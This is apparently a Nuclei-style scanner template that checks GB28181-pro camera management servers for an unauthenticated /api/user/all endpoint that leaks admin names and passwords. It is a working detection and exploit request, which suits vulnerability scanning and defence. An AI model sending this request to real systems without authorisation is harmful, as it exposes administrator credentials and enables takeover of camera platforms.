id: GB28181-unauthorized

info:
  name: GB28181摄像头管理平台-user未授权访问
  author: unknown
  severity: medium
  description: GB28181-pro开源物联网摄像头管理平台api/user存在未授权访问漏洞，攻击者可利用漏洞获取当前系统管理员用户名及密码进行登录系统。
  tags: unauthorized,info
  
http:
  - raw:
      - |
        GET /api/user/all HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"password":'
          - '"name":'
          - '"pushKey":'
      - type: status
        status: 
          - 200